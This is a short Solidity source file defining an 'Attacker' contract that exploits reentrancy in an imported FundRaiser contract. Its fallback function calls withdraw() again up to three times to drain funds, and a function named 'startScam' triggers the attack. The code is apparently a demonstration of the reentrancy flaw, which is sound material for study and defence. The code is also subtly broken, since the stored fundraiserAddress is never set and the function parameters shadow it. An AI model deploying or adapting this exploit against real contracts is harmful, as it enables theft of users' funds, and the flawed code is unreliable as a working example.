pragma solidity ^0.4.5;

import "./FundRaiser.sol";

contract Attacker {
    address public fundraiserAddress;
    uint256 public drainTimes = 0;

    //fallback function - it is called when transaction call happens
    function() payable {
        if (drainTimes < 3) {
            drainTimes++;
            FundRaiser(fundraiserAddress).withdraw();
        }
    }

    function getFunds() returns (uint256) {
        return address(this).balance;
    }

    function payMe(address fundraiserAddress) payable {
        FundRaiser(fundraiserAddress).contribute.value(msg.value)();
    }

    function startScam(address fundraiserAddress) {
        FundRaiser(fundraiserAddress).withdraw();
    }
}
